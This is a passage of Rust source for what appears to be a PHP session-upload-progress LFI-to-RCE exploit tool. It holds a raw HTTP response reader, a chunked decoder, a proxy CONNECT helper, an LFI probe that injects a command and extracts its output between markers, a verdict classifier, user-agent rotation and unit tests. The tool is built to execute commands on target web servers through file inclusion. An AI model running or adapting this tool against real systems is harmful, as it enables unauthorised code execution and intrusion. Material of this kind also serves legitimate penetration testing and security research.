            return Err("proxy closed before CONNECT completed".into());
        }
        buf.extend_from_slice(&tmp[..n]);
        if buf.windows(4).any(|w| w == b"\r\n\r\n") {
            break;
        }
        if buf.len() > 65536 {
            return Err("proxy response too large".into());
        }
    }
    let head = String::from_utf8_lossy(&buf);
    let first = head.lines().next().unwrap_or("");
    if !first.contains(" 200 ") && !first.contains(" 200\r") {
        return Err(format!("proxy CONNECT failed: {}", first));
    }
    Ok(s)
}

// ============================================================================
// Raw response reader
// ============================================================================

fn read_raw_response(cfg: &Config, conn: &mut dyn ReadWrite) -> Result<RawResponse, String> {
    let mut buf = Vec::new();
    let mut tmp = [0u8; 4096];
    let deadline = Instant::now() + cfg.timeout;
    let mut timed_out = false;
    let mut transport_error: Option<String> = None;

    let mut header_start: usize = 0;
    let mut header_end: Option<usize> = None;
    let mut content_length: Option<usize> = None;
    let mut has_te = false;
    let mut search_from = 0usize;

    loop {
        if transport_error.is_some() {
            break;
        }
        if Instant::now() >= deadline {
            timed_out = true;
            break;
        }
        // Content-Length early-exit only applies when TE is not chunked
        // (RFC 7230 §3.3.3: chunked wins when both are present).
        if !has_te {
            if let (Some(h), Some(cl)) = (header_end, content_length) {
                if buf.len() >= h + 4 + cl {
                    break;
                }
            }
        }

        match conn.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => {
                if buf
                    .len()
                    .checked_add(n)
                    .is_none_or(|l| l > MAX_RAW_RESPONSE_BUFFER)
                {
                    transport_error = Some(format!(
                        "raw response buffer exceeded {} bytes",
                        MAX_RAW_RESPONSE_BUFFER
                    ));
                    break;
                }
                buf.extend_from_slice(&tmp[..n]);

                if header_end.is_none() {
                    // Header parse MUST precede the chunked-completion check
                    // below: a single read can carry the final header block
                    // AND the complete chunked body. Do not reorder.
                    while let Some(rel) = find_subslice(&buf[search_from..], b"\r\n\r\n") {
                        let abs = search_from + rel;
                        if parse_status_from_head(&buf[search_from..abs])
                            .map(|s| (100..200).contains(&s))
                            .unwrap_or(false)
                        {
                            search_from = abs + 4;
                            continue;
                        }
                        header_start = search_from;
                        header_end = Some(abs);
                        // FIX: header slice starts at search_from, not 0 —
                        // interim blocks must not contaminate the final one.
                        let head_lower =
                            String::from_utf8_lossy(&buf[search_from..abs]).to_lowercase();
                        content_length = parse_content_length(&head_lower);
                        has_te = head_lower.lines().any(|l| {
                            l.strip_prefix("transfer-encoding:")
                                .map(|v| v.trim().contains("chunked"))
                                .unwrap_or(false)
                        });
                        break;
                    }
                }

                if let Some(h) = header_end {
                    if has_te {
                        if let ChunkedState::Complete(_) = try_decode_chunked(&buf[h + 4..]) {
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                match e.kind() {
                    std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut => {
                        timed_out = true;
                    }
                    _ => transport_error = Some(e.to_string()),
                }
                break;
            }
        }
    }

    let r = match header_end {
        Some(h) => parse_raw_response(&buf, header_start, h, has_te, timed_out, transport_error),
        None => RawResponse {
            timed_out,
            transport_error,
            ..Default::default()
        },
    };
    Ok(r)
}

fn parse_status_from_head(head: &[u8]) -> Option<u16> {
    let s = std::str::from_utf8(head).ok()?;
    s.lines().next()?.split_whitespace().nth(1)?.parse().ok()
}

fn parse_content_length(head_lower: &str) -> Option<usize> {
    head_lower.lines().find_map(|l| {
        l.strip_prefix("content-length:")
            .and_then(|v| v.trim().parse().ok())
    })
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn try_decode_chunked(body: &[u8]) -> ChunkedState {
    let mut out = Vec::with_capacity(body.len().min(64 * 1024));
    let mut i = 0usize;
    loop {
        let Some(rel) = find_subslice(&body[i..], b"\r\n") else {
            return ChunkedState::Incomplete;
        };
        let line = &body[i..i + rel];
        let size_str = line.split(|&b| b == b';').next().unwrap_or(line);
        let size_hex = match std::str::from_utf8(size_str) {
            Ok(s) => s.trim(),
            Err(_) => return ChunkedState::Malformed("non-utf8 chunk size".into()),
        };
        let size = match usize::from_str_radix(size_hex, 16) {
            Ok(s) => s,
            Err(_) => return ChunkedState::Malformed(format!("bad chunk size {:?}", size_hex)),
        };
        i += rel + 2;

        if size == 0 {
            let mut trailer_bytes = 0usize;
            let mut trailer_count = 0usize;
            loop {
                let Some(te) = find_subslice(&body[i..], b"\r\n") else {
                    return ChunkedState::Incomplete;
                };
                let trailer = &body[i..i + te];
                i += te + 2;
                if trailer.is_empty() {
                    return ChunkedState::Complete(out);
                }
                trailer_bytes = match trailer_bytes.checked_add(trailer.len()) {
                    Some(b) => b,
                    None => return ChunkedState::Malformed("trailer byte overflow".into()),
                };
                trailer_count += 1;
                if trailer_bytes > MAX_TRAILER_BYTES {
                    return ChunkedState::Malformed("trailer bytes exceeded".into());
                }
                if trailer_count > MAX_TRAILER_COUNT {
                    return ChunkedState::Malformed("trailer count exceeded".into());
                }
            }
        }

        let Some(new_len) = out.len().checked_add(size) else {
            return ChunkedState::Malformed("chunk length overflow".into());
        };
        if new_len > MAX_CHUNKED_BODY {
            return ChunkedState::Malformed("decoded body exceeded limit".into());
        }
        let Some(end) = i.checked_add(size).and_then(|x| x.checked_add(2)) else {
            return ChunkedState::Malformed("chunk length overflow".into());
        };
        if body.len() < end {
            return ChunkedState::Incomplete;
        }
        out.extend_from_slice(&body[i..i + size]);
        i += size;
        if &body[i..i + 2] != b"\r\n" {
            return ChunkedState::Malformed("missing CRLF after chunk data".into());
        }
        i += 2;
    }
}

fn parse_raw_response(
    buf: &[u8],
    header_start: usize,
    header_end: usize,
    has_te: bool,
    timed_out: bool,
    transport_error: Option<String>,
) -> RawResponse {
    let mut r = RawResponse {
        timed_out,
        transport_error,
        ..Default::default()
    };
    let head = String::from_utf8_lossy(&buf[header_start..header_end]);
    let mut lines = head.lines();
    if let Some(sl) = lines.next() {
        r.status = sl.split_whitespace().nth(1).and_then(|s| s.parse().ok());
    }
    for line in lines {
        let Some((k, v)) = line.split_once(':') else {
            continue;
        };
        let v = v.trim();
        match k.trim().to_lowercase().as_str() {
            "set-cookie" => r.set_cookie.push(v.to_string()),
            "location" => r.location = Some(v.to_string()),
            "retry-after" => r.retry_after = Some(v.to_string()),
            "x-ratelimit-remaining" | "x-rate-limit-remaining" if v == "0" => {
                r.rate_limit_signal = Some(format!("{}: {}", k.trim(), v));
            }
            _ => {}
        }
    }

    let raw_body = &buf[header_end + 4..];
    if has_te {
        match try_decode_chunked(raw_body) {
            ChunkedState::Complete(decoded) => r.body = decoded,
            ChunkedState::Malformed(e) => {
                if r.transport_error.is_none() {
                    r.transport_error = Some(e);
                }
            }
            ChunkedState::Incomplete => {
                if r.transport_error.is_none() {
                    r.transport_error = Some("chunked: truncated".into());
                }
            }
        }
    } else {
        r.body = raw_body.to_vec();
    }
    r
}

// ============================================================================
// Session / redirect helpers
// ============================================================================

fn sid_was_regenerated(cfg: &Config, race: &RawResponse) -> bool {
    let name = cfg.session_name.to_lowercase();
    race.set_cookie.iter().any(|c| {
        c.split(';')
            .next()
            .and_then(|kv| kv.trim().split_once('='))
            .map(|(k, v)| k.to_lowercase() == name && v.trim() != cfg.sid)
            .unwrap_or(false)
    })
}

fn is_login_gate(cfg: &Config, race: &RawResponse) -> bool {
    let Some(loc) = &race.location else {
        return false;
    };
    let Ok(base) = Url::parse(&cfg.target) else {
        return false;
    };
    let Ok(loc_url) = base.join(loc) else {
        return false;
    };
    if loc_url.host_str() != base.host_str() {
        return false;
    }
    let lower = loc.to_lowercase();
    [
        "login",
        "signin",
        "sign-in",
        "sign_in",
        "auth",
        "session/new",
        "account/login",
        "wp-login",
        "admin/login",
    ]
    .iter()
    .any(|k| lower.contains(k))
}

// ============================================================================
// LFI probe
// ============================================================================

fn build_lfi_url(cfg: &Config, template: &str) -> String {
    template
        .replace("%SID%", &urlencoding::encode(&cfg.sid))
        .replace("%CMD%", &urlencoding::encode(&cfg.cmd))
        .replace("%PARAM%", &urlencoding::encode(&cfg.param))
}

fn lfi_probe(
    cfg: &Config,
    client: &HttpClient,
    url: &str,
    first_logged: &mut bool,
    worker: usize,
) -> Result<Option<LfiHit>, String> {
    let mut resp: HttpResponse = client
        .get(url)
        .header(reqwest::header::COOKIE, build_cookie_header(cfg))
        .send()
        .map_err(|e| e.to_string())?;

    if cfg.verbose {
        let st = resp.status().as_u16();
        if st != 200 || !*first_logged {
            eprintln!("[w{}] LFI -> {}", worker, st);
            if st == 200 {
                *first_logged = true;
            }
        }
    }

    let mut bytes = Vec::new();
    let mut chunk = [0u8; 8192];
    loop {
        let n = resp.read(&mut chunk).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        bytes.extend_from_slice(&chunk[..n]);
        if bytes.len() >= MAX_LFI_BODY {
            bytes.truncate(MAX_LFI_BODY);
            break;
        }
    }
    let body = String::from_utf8_lossy(&bytes);

    if let Some(out) = extract_execution(&body, &cfg.marker) {
        let disabled = DISABLED_FN_MARKERS
            .iter()
            .any(|d| out.to_lowercase().contains(d));
        let out = if out.is_empty() {
            "[executed — empty output]".to_string()
        } else {
            out
        };
        return Ok(Some(LfiHit {
            output: out,
            disabled,
        }));
    }
    Ok(None)
}

fn extract_execution(body: &str, marker: &str) -> Option<String> {
    let idx: Vec<usize> = body.match_indices(marker).map(|(i, _)| i).collect();
    if idx.len() < 2 {
        return None;
    }
    let a = idx[idx.len() - 2];
    let b = idx[idx.len() - 1];
    if b <= a + marker.len() || b - a > MAX_MARKER_SPAN {
        return None;
    }
    Some(body[a + marker.len()..b].to_string())
}

// ============================================================================
// Verdict classification — deterministic
// ============================================================================

/// Precedence, in order:
///
///   1. transport failure / timeout                → Unknown
///   2. 429, or explicit rate-limit header         → RateLimited
///   3. 401                                        → AuthRequired
///   4. 3xx + Location matches login gate          → AuthRequired
///   5. 3xx + Location does not match login gate   → HttpError
///   6. 5xx                                        → HttpError
///   7. any LFI hit                                → Unconfirmed
///   8. LFI probed, no hit                         → NoLfi
///   9. 2xx, no LFI template (could not probe)     → Unconfirmed
///  10. otherwise                                  → Unknown
///
/// `Retry-After` is surfaced as a note and in the `retry_after` report field
/// but does **not** influence the verdict — it signals a requested delay,
/// not proof of rate limiting.
fn classify(
    cfg: &Config,
    race: &RawResponse,
    hits: &[LfiHit],
    lfi_attempts: usize,
) -> (Verdict, String, Vec<String>) {
    let mut notes = Vec::new();

    let race_note = if race.timed_out {
        notes.push("race POST timed out".into());
        "timeout on throttled upload".to_string()
    } else if let Some(e) = &race.transport_error {
        notes.push(format!("race POST transport error: {}", e));
        format!("transport error: {}", e)
    } else if let Some(s) = race.status {
        if s == 429 {
            notes.push("race POST returned 429".into());
            "HTTP 429 (rate limited)".to_string()
        } else if race.rate_limit_signal.is_some() {
            notes.push(format!(
                "rate-limit signal: {}",
                race.rate_limit_signal.as_deref().unwrap_or("")
            ));
            format!("HTTP {} (rate-limit signal)", s)
        } else if (500..600).contains(&s) {
            notes.push(format!("race POST returned {}", s));
            format!("HTTP {} from upload handler", s)
        } else if (300..400).contains(&s) {
            if is_login_gate(cfg, race) {
                "HTTP 3xx → login gate".to_string()
            } else {
                format!(
                    "HTTP 3xx → {}",
                    race.location.as_deref().unwrap_or("(no Location)")
                )
            }
        } else {
            format!("HTTP {}", s)
        }
    } else {
        "no HTTP status observed".to_string()
    };

    if let Some(ra) = &race.retry_after {
        notes.push(format!(
            "server sent Retry-After: {} (HTTP {}) — not interpreted as rate limiting",
            ra,
            race.status
                .map(|s| s.to_string())
                .unwrap_or_else(|| "?".into()),
        ));
    }

    let rate_limited = race.status == Some(429) || race.rate_limit_signal.is_some();

    let verdict = if race.timed_out || race.transport_error.is_some() {
        Verdict::Unknown
    } else if rate_limited {
        Verdict::RateLimited
    } else if race.status == Some(401) {
        Verdict::AuthRequired
    } else if race.is_3xx() {
        if is_login_gate(cfg, race) {
            Verdict::AuthRequired
        } else {
            Verdict::HttpError
        }
    } else if race.is_5xx() {
        Verdict::HttpError
    } else if !hits.is_empty() {
        let h = &hits[0];
        if h.disabled {
            notes.push("marker pair present, content includes a disabled-function warning".into());
        } else if h.output.trim().is_empty() || h.output == "[executed — empty output]" {
            notes.push(
                "marker pair present, content empty — command may be disabled or returned nothing"
                    .into(),
            );
        } else {
            notes.push("marker pair present with content — reflection cannot be ruled out; verdict capped at UNCONFIRMED".into());
        }
        Verdict::Unconfirmed
    } else if lfi_attempts > 0 {
        // Attempts, not confirmed dispatches. NoLfi means "we tried and saw
        // nothing," not "we are certain N requests reached the target."
        notes.push(format!(
            "{} LFI probe attempts ran and did not demonstrate inclusion",
            lfi_attempts
        ));
        Verdict::NoLfi
    } else if race.is_2xx() {
        if cfg.lfi_template.is_none() {
            notes.push(
                "2xx from upload handler; no --lfi template so inclusion could not be probed"
                    .into(),
            );
        }
        Verdict::Unconfirmed
    } else {
        Verdict::Unknown
    };

    (verdict, race_note, notes)
}

// ============================================================================
// Config assembly
// ============================================================================

fn build_config(cli: Cli) -> Result<Config, String> {
    validate_no_crlf("--param", &cli.param)?;
    validate_no_crlf("--progress-field", &cli.progress_field)?;
    validate_no_crlf("--session-name", &cli.session_name)?;

    let url = Url::parse(&cli.target).map_err(|e| format!("bad target URL: {}", e))?;
    let https = match url.scheme() {
        "https" => true,
        "http" => false,
        other => return Err(format!("unsupported scheme '{}'", other)),
    };
    let host_raw = url.host_str().ok_or("URL missing host")?.to_string();
    let host = if host_raw.starts_with('[') && host_raw.ends_with(']') {
        host_raw[1..host_raw.len() - 1].to_string()
    } else {
        host_raw
    };
    let port = url.port_or_known_default().ok_or("cannot determine port")?;
    let post_path = cli.post_path.clone().unwrap_or_else(|| {
        let p = url.path();
        if p.is_empty() {
            "/".to_string()
        } else {
            p.to_string()
        }
    });

    let mut cookie_parts: Vec<String> = Vec::new();
    if let Some(c) = &cli.cookie {
        cookie_parts.push(c.clone());
    }
    let mut filtered_headers: Vec<String> = Vec::new();
    for h in &cli.headers {
        if let Some((k, v)) = h.split_once(':') {
            if k.trim().eq_ignore_ascii_case("cookie") {
                cookie_parts.push(v.trim().to_string());
                continue;
            }
        }
        filtered_headers.push(h.clone());
    }
    let cookie = if cookie_parts.is_empty() {
        None
    } else {
        Some(cookie_parts.join("; "))
    };

    let sid_charset = SidCharset::parse(&cli.sid_charset)?;
    let (sid, sid_explicit) = match cli.sid.clone() {
        Some(s) => (s, true),
        None => (random_sid(cli.sid_length, sid_charset), false),
    };
    let user_agent = cli.user_agent.clone().unwrap_or_else(random_ua);

    Ok(Config {
        target: cli.target,
        host,
        port,
        https,
        post_path,
        user_agent,
        stall: Duration::from_millis(cli.stall),
        timeout: Duration::from_secs(cli.timeout),
        progress_field: cli.progress_field,
        cmd: cli.cmd,
        param: cli.param,
        sid,
        sid_explicit,
        sid_charset,
        session_name: cli.session_name,
        insecure: cli.insecure,
        no_verify_hostname: cli.no_verify_hostname,
        sni: cli.sni,
        verbose: cli.verbose,
        dry_run: cli.dry_run,
        lfi_template: cli.lfi,
        lfi_workers: cli.lfi_workers.max(1),
        lfi_interval: Duration::from_millis(cli.lfi_interval),
        lfi_max_attempts: cli.lfi_max_attempts.max(1),
        cookie,
        headers: filtered_headers,
        proxy: cli.proxy,
        output_json: cli.output,
        skip_fingerprint: cli.skip_fingerprint,
        marker: format!("PFMARK_{}", random_alnum(8)),
        retries: cli.retries.max(1),
    })
}

fn validate_no_crlf(field: &str, value: &str) -> Result<(), String> {
    if value.contains('\r') || value.contains('\n') {
        return Err(format!("{} must not contain CR/LF", field));
    }
    Ok(())
}

// ============================================================================
// Utilities
// ============================================================================

fn try_reserve(counter: &AtomicUsize, max: usize) -> bool {
    let mut cur = counter.load(Ordering::Relaxed);
    loop {
        if cur >= max {
            return false;
        }
        match counter.compare_exchange_weak(cur, cur + 1, Ordering::Relaxed, Ordering::Relaxed) {
            Ok(_) => return true,
            Err(c) => cur = c,
        }
    }
}

fn random_alnum(n: usize) -> String {
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(n)
        .map(char::from)
        .collect()
}

fn random_sid(len: usize, charset: SidCharset) -> String {
    let chars = charset.chars();
    let mut rng = rand::thread_rng();
    (0..len)
        .map(|_| chars[rng.gen_range(0..chars.len())] as char)
        .collect()
}

fn random_ua() -> String {
    const UAS: &[&str] = &[
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    ];
    UAS[rand::thread_rng().gen_range(0..UAS.len())].to_string()
}

// ============================================================================
// Tests — the three load-bearing regressions are pinned below.
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    fn test_config() -> Config {
        Config {
            target: "http://example.test/".into(),
            host: "example.test".into(),
            port: 80,
            https: false,
            post_path: "/".into(),
            user_agent: "test".into(),
            stall: Duration::from_millis(3000),
            timeout: Duration::from_secs(5),
            progress_field: "PHP_SESSION_UPLOAD_PROGRESS".into(),
            cmd: "id".into(),
            param: "c".into(),
            sid: "test".into(),
            sid_explicit: false,
            sid_charset: SidCharset::Default5,
            session_name: "PHPSESSID".into(),
            insecure: false,
            no_verify_hostname: false,
            sni: None,
            verbose: false,
            dry_run: false,
            lfi_template: Some("http://example.test/x?f=%SID%".into()),
            lfi_workers: 1,
            lfi_interval: Duration::from_millis(100),
            lfi_max_attempts: 100,
            cookie: None,
            headers: Vec::new(),
            proxy: None,
            output_json: None,
            skip_fingerprint: true,
            marker: "PFMARK_test".into(),
            retries: 1,
        }
    }

    fn rr_status(s: u16) -> RawResponse {
        RawResponse {
            status: Some(s),
            ..Default::default()
        }
    }

    // --- Regression: 1xx block parsing must skip interim responses ---

    #[test]
    fn parse_status_skips_1xx() {
        let buf = b"HTTP/1.1 100 Continue\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi";
        let first = find_subslice(buf, b"\r\n\r\n").unwrap();
        assert_eq!(parse_status_from_head(&buf[..first]), Some(100));
        let search_from = first + 4;
        let second_rel = find_subslice(&buf[search_from..], b"\r\n\r\n").unwrap();
        let second_abs = search_from + second_rel;
        assert_eq!(
            parse_status_from_head(&buf[search_from..second_abs]),
            Some(200)
        );
    }

    // --- Regression: interim headers must not contaminate the final block ---

    #[test]
    fn interim_headers_do_not_contaminate_final() {
        let buf = b"HTTP/1.1 100 Continue\r\nTransfer-Encoding: chunked\r\n\r\n\
                    HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi";
        let mut search_from = 0;
        let (mut header_end, mut content_length, mut has_te) = (None, None, false);
        while let Some(rel) = find_subslice(&buf[search_from..], b"\r\n\r\n") {
            let abs = search_from + rel;
            if parse_status_from_head(&buf[search_from..abs])
                .map(|s| (100..200).contains(&s))
                .unwrap_or(false)
            {
                search_from = abs + 4;
                continue;
            }
            header_end = Some(abs);
            let head_lower = String::from_utf8_lossy(&buf[search_from..abs]).to_lowercase();
            content_length = parse_content_length(&head_lower);
            has_te = head_lower.lines().any(|l| {
                l.strip_prefix("transfer-encoding:")
                    .map(|v| v.trim().contains("chunked"))
                    .unwrap_or(false)
            });
            break;
        }
        assert_eq!(content_length, Some(2));
        assert!(!has_te);
        assert_eq!(
            parse_status_from_head(&buf[search_from..header_end.unwrap()]),
            Some(200)
        );
    }

    // --- Chunked framing ---

    #[test]
    fn chunked_complete() {
        assert!(matches!(
            try_decode_chunked(b"5\r\nhello\r\n0\r\n\r\n"),
            ChunkedState::Complete(v) if v == b"hello"
        ));
    }

    #[test]
    fn chunked_extensions_and_trailers() {
        assert!(matches!(
            try_decode_chunked(b"5;x=y\r\nhello\r\n0\r\nX-A: 1\r\n\r\n"),
            ChunkedState::Complete(v) if v == b"hello"
        ));
    }

    #[test]
    fn chunked_truncated() {
        assert!(matches!(
            try_decode_chunked(b"5\r\nhel"),
            ChunkedState::Incomplete
        ));
    }

    #[test]
    fn chunked_missing_crlf() {
        assert!(matches!(
            try_decode_chunked(b"5\r\nhelloXX0\r\n\r\n"),
            ChunkedState::Malformed(_)
        ));
    }

    #[test]
    fn chunked_bad_size() {
        assert!(matches!(
            try_decode_chunked(b"ZZ\r\nhello\r\n0\r\n\r\n"),
            ChunkedState::Malformed(_)
        ));
    }

    #[test]
    fn chunked_zero_only() {
        assert!(matches!(
            try_decode_chunked(b"0\r\n\r\n"),
            ChunkedState::Complete(v) if v.is_empty()
        ));
    }

    // --- Regression: oversize claim must be Malformed, not Incomplete ---

    #[test]
    fn chunked_oversize_claim_is_rejected_before_body_check() {
        // 0xFFFFFFFFFFFFFFFF is usize::MAX on 64-bit (size limit fires) and
        // unparseable on 32-bit. Both paths yield Malformed; Incomplete must
        // not be reachable for this input.
        assert!(matches!(
            try_decode_chunked(b"FFFFFFFFFFFFFFFF\r\nx"),
            ChunkedState::Malformed(_)
        ));
    }

    #[test]
    fn chunked_rejects_many_trailers() {
        let mut buf = b"0\r\n".to_vec();
        for _ in 0..100 {
            buf.extend_from_slice(b"X-A: 1\r\n");
        }
        buf.extend_from_slice(b"\r\n");
        assert!(matches!(
            try_decode_chunked(&buf),
            ChunkedState::Malformed(_)
        ));
    }

    // --- Atomic attempt reservation ---

    #[test]
    fn cap_is_atomic() {
        let counter = Arc::new(AtomicUsize::new(0));
        let mut handles = Vec::new();
        for _ in 0..16 {
            let c = counter.clone();
            handles.push(thread::spawn(move || {
                let mut granted = 0usize;
                while try_reserve(&c, 100) {
                    granted += 1;
                }
                granted
            }));
        }
        let total: usize = handles.into_iter().map(|h| h.join().unwrap()).sum();
        assert_eq!(total, 100);
    }

    // --- Verdict classification table ---

    #[test]
    fn classify_table() {
        let cfg = test_config();
        let none: Vec<LfiHit> = vec![];
        let hit = || {
            vec![LfiHit {
                output: "x".into(),
                disabled: false,
            }]
        };
        let hit_empty = || {
            vec![LfiHit {
                output: "[executed — empty output]".into(),
                disabled: false,
            }]
        };

        let err = RawResponse {
            transport_error: Some("x".into()),
            ..Default::default()
        };
        assert_eq!(classify(&cfg, &err, &none, 0).0, Verdict::Unknown);

        let to = RawResponse {
            timed_out: true,
            ..Default::default()
        };
        assert_eq!(classify(&cfg, &to, &none, 0).0, Verdict::Unknown);

        assert_eq!(
            classify(&cfg, &rr_status(429), &none, 0).0,
            Verdict::RateLimited
        );
        assert_eq!(
            classify(&cfg, &rr_status(401), &none, 0).0,
            Verdict::AuthRequired
        );
        assert_eq!(
            classify(&cfg, &rr_status(500), &none, 0).0,
            Verdict::HttpError
        );
        assert_eq!(
            classify(&cfg, &rr_status(200), &hit(), 1).0,
            Verdict::Unconfirmed
        );
        assert_eq!(
            classify(&cfg, &rr_status(200), &hit_empty(), 1).0,
            Verdict::Unconfirmed
        );
        assert_eq!(classify(&cfg, &rr_status(200), &none, 5).0, Verdict::NoLfi);
        assert_eq!(
            classify(&cfg, &rr_status(200), &none, 0).0,
            Verdict::Unconfirmed
        );
    }

    #[test]
    fn rate_limit_via_header() {
        let cfg = test_config();
        let mut rr = rr_status(200);
        rr.rate_limit_signal = Some("X-RateLimit-Remaining: 0".into());
        assert_eq!(classify(&cfg, &rr, &[], 0).0, Verdict::RateLimited);
    }

    // --- Regression: Retry-After is a signal, not a verdict ---

    #[test]
    fn retry_after_on_503_stays_http_error() {
        let cfg = test_config();
        let mut rr = rr_status(503);
        rr.retry_after = Some("5".into());
        assert_eq!(classify(&cfg, &rr, &[], 0).0, Verdict::HttpError);
    }

    #[test]
    fn retry_after_on_429_is_rate_limited() {
        // 429 alone decides; Retry-After is supplementary.
        let cfg = test_config();
        let mut rr = rr_status(429);
        rr.retry_after = Some("5".into());
        assert_eq!(classify(&cfg, &rr, &[], 0).0, Verdict::RateLimited);
    }

    #[test]
    fn retry_after_on_200_is_not_a_verdict_change() {
        let cfg = test_config();
        let mut rr = rr_status(200);
        rr.retry_after = Some("5".into());
        assert_eq!(classify(&cfg, &rr, &[], 0).0, Verdict::Unconfirmed);
        assert_eq!(classify(&cfg, &rr, &[], 5).0, Verdict::NoLfi);
    }
}
